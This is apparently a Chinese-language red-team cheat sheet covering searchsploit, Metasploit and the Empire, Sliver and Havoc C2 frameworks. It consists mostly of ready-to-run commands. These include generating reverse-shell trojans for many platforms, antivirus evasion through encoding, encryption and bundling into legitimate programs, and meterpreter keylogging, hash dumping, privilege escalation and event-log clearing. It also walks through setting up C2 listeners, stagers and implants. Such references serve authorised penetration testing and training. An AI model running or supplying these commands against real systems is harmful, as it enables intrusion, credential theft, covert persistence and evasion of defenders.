# 漏洞利用与 C2

漏洞搜索(searchsploit)、利用框架(Metasploit)与 C2 框架(Empire/Starkiller、Sliver、Havoc)的启动与操作速查。

本文件工具:searchsploit、msfconsole、meterpreter、msfvenom、powershell-empire(含 starkiller)、sliver、havoc

## searchsploit — 离线搜索 ExploitDB 公开利用代码

来源:apt 包 exploitdb(命令 /usr/bin/searchsploit,漏洞库数据在 /usr/share/exploitdb)

```bash
searchsploit apache tomcat                                  # 关键词搜索(默认匹配标题+路径)
searchsploit -t "remote code execution"                     # -t 只搜标题,结果更精准
searchsploit -m 40870                                       # 把 EDB-ID 40870 的利用代码镜像复制到当前目录
searchsploit -x 40870                                       # 直接分页查看该 exploit 内容(-x)
```

```bash
searchsploit --nmap /root/nmap-sV.xml                       # 导入 nmap -oX 的 XML,按服务/版本自动推荐利用
searchsploit -p 40870                                       # 只显示该 exploit 的完整路径
export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334   # 更新库前先走代理
searchsploit -u                                             # git 方式更新 exploitdb(较慢,可选项)
```

参数速查:
- `<关键词>`:直接搜索,多个词之间为 AND 关系
- `-t`:仅匹配标题(默认还匹配文件路径)
- `-m <EDB-ID>`:镜像复制 exploit 及同名文件到当前目录
- `-x <EDB-ID>`:用分页器查看 exploit 内容
- `-p <EDB-ID>`:只显示 exploit 完整路径
- `-w`:显示 exploit 对应的 EDB 网页链接
- `--nmap <xml>`:结合 nmap XML 输出自动匹配
- `--exclude <词>`:排除干扰项(如 `--exclude Denial\ of\ Service`)
- `-u`:更新 exploitdb 数据库

注意:复制(-m)出来的脚本先读懂再运行,DoS/验证性 PoC 居多;结合 `nmap -sV -oX` 再 `--nmap` 交叉检索效率最高。

## msfconsole — Metasploit 利用框架主控台

来源:apt 包 metasploit-framework(命令 /usr/bin/msfconsole)

```bash
sudo msfdb init            # 首次使用初始化 PostgreSQL 工作区(只做一次)
sudo msfdb status          # 查看数据库状态
msfconsole -q              # 启动框架,-q 跳过 banner 动画
```

```bash
# ===== 以下命令在 msfconsole 内执行 =====
db_nmap -sV -O -p- <目标IP>            # 扫描结果直接入库(目标、服务、版本自动关联)
search type:exploit vsftpd              # 按条件搜索模块(可加 platform:linux 等过滤)
use exploit/unix/ftp/vsftpd_234_backdoor  # 进入目标模块
show options                            # 查看必须设置的参数
set RHOSTS <目标IP>                     # 设置目标地址
set LHOST <本机VPN网卡IP>               # 设置回连地址(多网卡环境必设)
set PAYLOAD cmd/unix/reverse_netcat_small  # 选择载荷(show payloads 可列出)
exploit                                 # 发起利用(run 等价;成功后进入会话)
sessions -l                             # 列出全部活动会话
sessions -i 1                           # 切入 1 号会话交互
```

```bash
# ===== 载荷监听器(配合 msfvenom 生成的载荷)=====
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <本机VPN网卡IP>; set LPORT 4444; run"
# -x 一次性执行命令串:起 handler 等待回连
```

参数速查(msfconsole 常用子命令):
- `db_nmap <参数>`:nmap 扫描入库
- `db_import <xml>`:导入已有 nmap XML
- `search <条件>`:搜模块(支持 name/type/platform/cve 过滤)
- `use <模块路径>`:进入模块;`back` 返回
- `show options|payloads|targets`:查看参数/载荷/目标
- `set / unset <参数>`:设置/取消参数(RHOSTS、LHOST、LPORT)
- `exploit / run -j`:前台执行 / 后台执行(-j)
- `sessions -l / -i <id>`:列出/进入会话
- `vulns` / `services` / `hosts`:查询工作区入库数据
- `msfconsole -q -x "<命令串>"`:启动即执行命令

注意:`msfdb init` 后 hosts/services/vulns 才可持续化;多网卡务必显式 `set LHOST`,否则回连可能落到错误网卡;生产环境用 `exploit -j` 后台跑防会话断连丢 shell。

## meterpreter — Metasploit 高级交互载荷(内存 shell)

来源:msf 会话内置(随 metasploit-framework 提供,无独立命令)

```bash
# ===== 以下命令在 meterpreter 会话内执行 =====
sysinfo                     # 目标系统信息(OS/架构/当前用户)
getuid                      # 当前运行身份
ps                          # 进程列表(挑选稳定宿主进程配合 migrate)
migrate <PID>               # 迁移进程(躲掉落地的原始进程)
getsystem                   # Windows 尝试提权到 SYSTEM
hashdump                    # 导出本地 SAM 哈希(需 SYSTEM,配合 09-凭证破解)
shell                       # 掉入原生 cmd/bash
```

```bash
# ===== 文件与网络常用操作 =====
upload /home/kali/上传文件.exe C:\\Temp\\上传文件.exe      # 上传文件到目标
download C:\\Users\\公共\\机密.docx /home/kali/落地/       # 下载文件回本机
portfwd add -l 3389 -p 3389 -r <内网目标IP>                # 端口转发:本机3389 -> 内网目标3389
screenshot                  # 目标屏幕截图
keyscan_start               # 开启键盘记录
keyscan_dump                # 导出键盘记录内容
background                  # 会话切回后台(等价 Ctrl+Z)
```

参数速查(会话内子命令):
- `sysinfo` / `getuid`:确认系统与身份
- `getsystem`:尝试命名管道等提权到 SYSTEM
- `migrate <PID>`:进程迁移,稳定存活
- `hashdump` / `lsa_dump_sam`:导出本地哈希
- `upload` / `download`:双向传文件
- `portfwd add -l -r -p`:本机端口转发进内网
- `route add <网段> <掩码> <会话ID>`:以受损主机为内网路由(在 msf 提示符下执行,或用 autoroute 模块)
- `keyscan_start` / `keyscan_dump` / `keyscan_stop`:键盘记录三件套
- `clearev`:清事件日志(动作大,慎用)

注意:`hashdump` 需 SYSTEM 权限;`migrate` 到 lsass 等关键进程易触发 EDR;内网穿透优先 portfwd/route,再上 ligolo(见 04-隧道)。

## msfvenom — 独立载荷生成器(各平台木马/后门)

来源:apt 包 metasploit-framework(命令 /usr/bin/msfvenom)

```bash
# ===== 多平台载荷生成:记得先起对应 handler(msfconsole 的 multi/handler)=====
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -f exe -o /tmp/win64.exe     # Windows x64 EXE
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -f elf -o /tmp/lin64.elf      # Linux x64 ELF
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<本机IP> LPORT=4444 -f macho -o /tmp/mac64                # macOS 可执行
msfvenom -p android/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -o /tmp/app.apk                 # Android APK
msfvenom -p php/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -f raw -o /tmp/shell.php            # PHP(传到可解析目录)
msfvenom -p python/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -f raw -o /tmp/shell.py          # Python 跨平台
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<本机IP> LPORT=4444 -f raw -o /tmp/shell.jsp             # JSP 内存马
msfvenom -p java/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -f war -o /tmp/shell.war           # WAR(部署 Tomcat)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<本机IP> LPORT=4444 -f psh-cmd -o /tmp/ps.cmd         # PowerShell 一句话
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -f asp -o /tmp/shell.asp        # ASP(WebShell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<本机IP> LPORT=4444 -f msi-nouac -o /tmp/up.msi       # MSI(配 07 的 AlwaysInstallElevated)
```

```bash
# ===== 编码/加密/模板(免杀基础操作)=====
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/enc.exe
# -e 指定编码器,-i 迭代 5 轮(对现代 AV 效果有限,更多靠加密/模板/自写加载器)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 --encrypt aes256 --encrypt-key <32字节Key> -f exe -o /tmp/aes.exe
# --encrypt 对 shellcode 整体加密(接收端需自行解密执行)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -x /tmp/正常程序.exe -k -f exe -o /tmp/捆绑.exe
# -x 模板注入 + -k 保留模板原有行为(捆绑马)
```

```bash
# ===== 枚举与查询 =====
msfvenom --list payloads | grep meterpreter       # 列出全部载荷(按需 grep)
msfvenom --list formats                           # 列出全部输出格式(见下表)
msfvenom --list encoders                          # 列出编码器
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options   # 查看某载荷可用变量
```

常用格式对照表(-f 参数):

| 平台/用途 | -f 格式 | 典型载荷 |
|---|---|---|
| Windows EXE | exe / exe-only / exe-service / exe-small | windows/x64/meterpreter/reverse_tcp |
| Windows DLL | dll | windows/x64/meterpreter/reverse_tcp |
| Windows MSI | msi / msi-nouac | windows/x64/shell_reverse_tcp |
| Linux ELF | elf / elf-so | linux/x64/meterpreter/reverse_tcp |
| macOS | macho / osx-app | osx/x64/shell_reverse_tcp |
| Android | (默认 apk,可省 -f) | android/meterpreter/reverse_tcp |
| PHP | raw | php/meterpreter/reverse_tcp |
| Python | raw / py | python/meterpreter/reverse_tcp |
| JSP | raw / jsp | java/jsp_shell_reverse_tcp |
| Java WAR | war | java/meterpreter/reverse_tcp |
| PowerShell | psh / psh-cmd / psh-net / ps1 | windows/x64/shell_reverse_tcp |
| ASP/ASPX | asp / aspx / aspx-exe | windows/meterpreter/reverse_tcp |
| Office/脚本 | vba / vbs / hta-psh / bash / sh | windows/x64/shell_reverse_tcp 等 |

参数速查:
- `-p <载荷名>`:指定载荷(`--list payloads` 查全量)
- `-f <格式>`:输出格式(`--list formats` 查全量)
- `-o <路径>`:输出到文件
- `-e <编码器>` / `-i <轮数>`:编码器与迭代次数
- `-b '\x00\x0a'`:剔除坏字符
- `-a x64` / `--platform windows`:强制架构/平台
- `-x <模板exe>` / `-k`:模板注入并保留原程序行为
- `--encrypt <类型>` / `--encrypt-key <密钥>`:整体加密(可 `--list encrypt`)
- `--smallest`:生成最小体积载荷
- `--list-options`:看当前载荷可用变量(LHOST/LPORT/EXITFUNC 等)

注意:生成不等于免杀——`-e` 编码对现代杀软基本无效;载荷生成后必须用 msfconsole `exploit/multi/handler` 且 payload/端口一致才能接住回连;JSP/WAR 类直接放 Web 可写目录。

## powershell-empire / starkiller — PowerShell C2 框架(服务端 + 图形界面)

来源:apt 包 powershell-empire(/usr/bin/powershell-empire,数据目录 /usr/share/powershell-empire);apt 包 starkiller(/usr/bin/starkiller-start 启动服务)

概念:**Listener(监听器)**= 服务端上等受害者回连的端点(http/https/hop 等);**Stager(落地载荷)**= 投递到目标的小体积加载器(如 bat/hta/dll),回连 listener 后拉起完整 Agent;Agent 上线后在 `agents` 中管理。

```bash
sudo powershell-empire server      # 前台启动团队服务器(脚本会自动 systemctl start mysql 并初始化 empire 库)
powershell-empire client           # 命令行客户端,默认连本机 REST 1337 端口
```

```bash
starkiller-start                   # 用 systemd 服务方式启动 Empire(REST 监听 1337,默认账号 empireadmin / password123)
starkiller-stop                    # 停止服务
systemctl status powershell-empire # 查看服务状态
```

```bash
export https_proxy=http://10.211.55.2:2334                               # GUI 需另下 AppImage,先走代理
xdg-open https://github.com/BC-Security/Starkiller/releases              # 浏览器打开 releases 页下载 Linux AppImage
chmod +x ~/Downloads/Starkiller-*.AppImage && ~/Downloads/Starkiller-*.AppImage   # 运行 GUI,连接 https://<服务器IP>:1337
```

```bash
# ===== 以下命令在 powershell-empire client(server 交互台)内执行 =====
uselistener http                     # 新建 HTTP 监听器
set Host http://<本机IP>:80           # 回连地址(建议公网/跳板可达地址)
set Port 80                           # 监听端口
execute                               # 启用监听器
listeners                            # 查看已启用监听器
usestager windows/launcher_bat http   # 生成 bat stager(第二个参数是监听器名)
execute                               # 生成,回显文件落地路径
agents                                # 上线代理列表
interact <代理名>                     # 进入代理
shell whoami                          # 代理内执行系统命令
```

参数速查(client 常用子命令):
- `uselistener <类型>`:创建监听器(http/https/hop/dropbox)
- `usestager <类型> <监听器名>`:生成载荷(windows/launcher_bat、multi/launcher、windows/hta、windows/macro)
- `set <参数> <值>` / `execute`:修改配置并生效
- `listeners`:监听器列表
- `agents` / `interact <名>`:代理列表/进入代理
- `shell <命令>`:代理内执行命令
- `info`:查看当前对象全部参数
- `kill <代理名>`:结束代理
- `restart <监听器>`:重启监听器

注意:默认凭据 empireadmin/password123 上线后立即在 server 配置里改掉;`powershell-empire server` 依赖 mysql,报数据库错误先 `sudo systemctl start mysql`;本 Kali 的 `starkiller` 命令已弃用(只打印提示),GUI 请用 AppImage;装有 AMSI/EDR 的目标 PowerShell stager 命中率低,可换 Windows 版 Empire 的其他 stager 或 Sliver。

## sliver — 交互式植入体(implant)C2 框架

来源:apt 包 sliver(/usr/bin/sliver-server 服务端与主控台、/usr/bin/sliver-client 操作员客户端)

```bash
sliver-server           # 启动服务端控制台(首次运行自动初始化 ~/.sliver 并生成证书)
```

```bash
# ===== 以下命令在 sliver-server 控制台内执行 =====
armory all                                        # 安装全部扩展(需联网:启动前先 export https_proxy=http://10.211.55.2:2334)
https --lhost <本机IP> --lport 443 --persistent   # 启动 HTTPS 监听器并持久化(重启自动恢复)
mtls --lhost <本机IP> --lport 8888                # 或启动 mTLS 监听器
generate --os windows --arch amd64 --format exe --https <本机IP>:443 --skip-symbols --save /tmp
# 生成 Windows implant:静态编译体积较大,--skip-symbols 减小体积,产物默认落在 ~/.sliver/
multiplayer                                        # 开启多人模式(gRPC 默认 31337 端口)
new-operator --name kali --lhost <本机IP> --lport 31337    # 签发操作员配置文件(~/.sliver/grpc/ 下)
```

```bash
sliver-client import ~/.sliver/grpc/kali_*.cfg    # 客户端导入操作员配置(按实际文件名,只需一次)
sliver-client                                     # 连接服务端进入操作台
# 操作台内:sessions 看会话;use <会话ID> 进入;shell 弹交互 shell;info 看权限;jobs 看监听任务
```

参数速查(控制台常用命令):
- `generate`:生成 implant(--os windows/linux/macos、--arch amd64/arm64、--format exe/shared/shellcode、--http/--https/--mtls/--dns 回连地址、--save 输出目录、--skip-symbols)
- `https` / `mtls` / `dns`:启动监听器(--lhost、--lport、--domain、--persistent)
- `multiplayer`:开启 gRPC 多人协作(31337)
- `new-operator --name --lhost --lport`:给队友签发 .cfg
- `armory all` / `armory install <名>`:扩展安装
- `jobs`:查看运行中的监听任务
- `sessions` / `use <ID>`:会话列表与切入
- `sliver-client import <cfg>`:客户端导入配置

注意:第一次 `armory all` 必须联网(设代理);~/.sliver/ 下的证书与 .cfg 等同 C2 控制权,严禁落盘到报告/截图;implant 静态编译体积大(约 10MB+),投递优先 shellcode/共享库格式或套域前置。

## havoc — 新一代 C2(团队服务器 + 客户端,Demon 植入体)

来源:apt 包 havoc 仅含客户端(/usr/bin/havoc,程序目录 /usr/share/havoc);团队服务器需源码构建(github.com/HavocFramework/Havoc)

```bash
export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334     # 克隆与构建需联网,先设代理
git clone https://github.com/HavocFramework/Havoc.git ~/tools/src/Havoc          # 克隆源码
cd ~/tools/src/Havoc && make ts-build                                            # 构建团队服务器(依赖 go、musl、mingw-w64,详见仓库 README)
```

```bash
cd ~/tools/src/Havoc/teamserver                                              # 进入 teamserver 目录
./teamserver <本机IP> <团队密码> --profile profiles/default.yaotl            # 启动团队服务器,默认端口 40056
```

```bash
havoc                        # 启动客户端 GUI(本机 apt 包自带)
# GUI 连接:Connect 对话框填 Host=<服务器IP>、Port=40056、User=5pider、Password=<团队密码>
# 上线流程:Attack→Listener 新建 HTTPS 监听器 → Payloads 生成 Windows EXE(Demon)→ 投递 → Agent 会话交互
```

参数速查(teamserver 启动参数与流程要点):
- `<服务器IP> <团队密码>`:两个必填位置参数(客户端连接用同一密码)
- `--profile <yaotl文件>`:指定监听器/植入体预置配置(默认 profiles/default.yaotl)
- 默认端口:`40056`(客户端-团队服务器通信)
- `make ts-build`:构建 teamserver;`make client-build`:从源码构建客户端(apt 版无需)
- GUI 关键入口:Attack→Listener(建监听)、Payloads(生成 Demon)、View→Agents(会话)、View→Sessions
- Demon:默认植入体,支持 sleep 混淆、间接 syscall、BOF 扩展
- 多人协作:队友各自装 havoc 客户端,连同一台 teamserver

注意:teamserver 必须有公网/内网可达 IP(客户端和植入体都回连它);构建失败九成是 go/mingw 依赖缺失,按仓库 README 补;Demon 对 EDR 较友好但非免杀银弹,投递前本地靶机先测。
